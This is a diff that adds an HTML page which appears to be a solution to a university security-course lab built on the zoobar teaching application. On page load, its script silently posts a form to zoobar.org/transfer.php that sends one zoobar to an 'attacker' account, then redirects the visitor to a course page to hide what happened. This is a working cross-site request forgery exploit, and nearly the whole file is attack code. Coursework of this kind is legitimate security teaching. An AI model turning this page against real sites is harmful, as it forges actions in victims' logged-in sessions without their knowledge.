@@ -1,0 +1,25 @@
+<html>
+  <head>
+    <script type="text/javascript">
+      var request  = new XMLHttpRequest();
+      request.open("post","http://zoobar.org/transfer.php",true);
+      request.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+      request.send("zoobars=1&recipient=attacker&submission=Send");
+      window.location.href="http://cseweb.ucsd.edu/classes/fa11/cse127-a";
+       
+
+    </script>
+  </head>
+  <body>
+    <p> here's a form</p>
+    <form name="transferform" method="post" action="http://zoobar.org/transfer.php">
+
+      <input type="text" name="zoobars"></input>
+      <input type="text" name="recipient"></input>
+      <input type="submit" name=submission value="Send"></input> 
+    </form>
+
+
+  </body>
+</html>
+
